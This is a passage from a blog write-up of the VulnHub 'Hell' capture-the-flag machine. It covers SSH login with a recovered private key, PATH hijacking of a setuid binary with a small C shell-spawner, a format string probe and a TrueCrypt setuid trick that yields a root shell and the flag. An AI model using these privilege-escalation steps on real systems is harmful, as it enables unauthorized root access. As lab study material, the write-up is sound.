</span><span class='line'>qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
</span><span class='line'>&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;
</span><span class='line'>george@hell:/media/truecrypt1$</span></code></pre></td></tr></table></div></figure></p>

<p>Then I download the SSH private key file to my Kali and try use it to login accounts found before.(only <strong>bazza</strong> and <strong>oj</strong> left)</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh &lt;a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#98;&#97;&#122;&#122;&#x61;&#64;&#x31;&#x30;&#46;&#49;&#48;&#x2e;&#49;&#x30;&#46;&#49;&#52;&#x36;">&#98;&#97;&#122;&#x7a;&#x61;&#x40;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#x31;&#48;&#x2e;&#49;&#52;&#54;&lt;/a> -i tr_id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Jul 16 10:32:07 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
</span><span class='line'>$ ls -alh &lt;br/>
</span><span class='line'>total 40K
</span><span class='line'>drwx&mdash;&mdash; 3 bazza bazza      4.0K Jul 17 08:35 .
</span><span class='line'>drwxr-xr-x 7 root  root       4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root  root        109 Jul  6  2014 barrebas.txt
</span><span class='line'>-rw&mdash;&mdash;- 1 bazza bazza       492 Jul 13 01:33 .bash_history
</span><span class='line'>-r-xr-sr-x 1 oj    developers 6.1K Jul  6  2014 part1
</span><span class='line'>-r-sr-xr-x 1 oj    oj         5.2K Jul  6  2014 part2
</span><span class='line'>drwx&mdash;&mdash; 2 bazza bazza      4.0K Jul  5  2014 .ssh
</span><span class='line'>-rw&mdash;&mdash;- 1 bazza bazza       781 Jul 13 01:42 .viminfo
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<h2>Moving to <strong>oj</strong></h2>

<p>Here we found executable program: <code>part1</code> and <code>part2</code> which has sticky bit set and owned by <strong>oj</strong>, so here should give a close check.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Checking integrity of calling target&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Binary and target confirmed.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Can&rsquo;t touch this &lt;em>nah na na na na naaaaaaaa nah&lt;/em>
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Here we can see that the running program has executed system command <code>id</code>. So very similar method used previously, I upload setuid.c and change it a little bit as follow and then gcc compile it to <code>/tmp/id</code>, then set environmental variable PATH to include <code>/tmp</code> at the beginning.</p>

<p><figure class='code'><figcaption><span>baz2.c  (baz2.c)</span> <a href='/downloads/code/baz2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span> <span class="mi">1005</span> <span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/id&quot;</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gcc baz2.c -o /tmp/id
</span><span class='line'>$ ls -l /tmp
</span><span class='line'>total 8
</span><span class='line'>-rwxr-xr-x 1 bazza bazza 5028 Jul 17 08:26 id
</span><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Checking integrity of calling target&hellip; Done!!&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Binary and target confirmed.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Can&rsquo;t touch this &lt;em>nah na na na na naaaaaaaa nah&lt;/em>
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>oj
</span><span class='line'>$ whoami
</span><span class='line'>oj
</span><span class='line'>$ /usr/bin/id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></code></pre></td></tr></table></div></figure></p>

<p>Now, I am oj. :D</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami
</span><span class='line'>oj
</span><span class='line'>$ ls -al
</span><span class='line'>total 592
</span><span class='line'>drwx&mdash;&mdash; 2 oj   oj     4096 Jul 17 23:48 .
</span><span class='line'>drwxr-xr-x 7 root root   4096 Jul  5  2014 ..
</span><span class='line'>-r-sr-xr-x 1 root root 592549 Jul  5  2014 echo
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root root    154 Jul  5  2014 How to be an infosec rockstar 101.txt
</span><span class='line'>$ ./echo AAAA-%p-%p
</span><span class='line'>AAAA-0x80488c0-0xbffffce8$
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found one executable file owned by <code>root</code> under oj&rsquo;s home folder and that file has sticky bit been set which could be a way to ROOT. Also <code>echo</code> program has <a href="https://www.owasp.org/index.php/Format_string_attack">Format String vulnerability</a></p>

<h2>Getting ROOT</h2>

<p>After suffering a lot of hours painful to deal with Format String exploit about <code>echo</code>. I still could not make it work for me :`(</p>

<p>However, there is another way to privilege escape to ROOT, which has been demostrated by <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">vincius777</a></p>

<p><figure class='code'><figcaption><span>getroot2.c  (getroot2.c)</span> <a href='/downloads/code/getroot2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  1.8M   26K  1.7M   2% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 18
</span><span class='line'>-rwsrwxrwx 1 root root   152 Jul 17 17:13 getroot
</span><span class='line'>-rwsrwxrwx 1 root root  4970 Jul 17 17:14 getroot2
</span><span class='line'>drwx&mdash;&mdash; 2 root root 12288 Jul 17 17:09 lost+found
</span><span class='line'>george@hell:/media/truecrypt1$ ./getroot2&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=0(root) gid=1000(george) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(george)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>pwd&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>/media/truecrypt1&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>whoami&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat /root/flag.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Congratulations of beating Hell.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
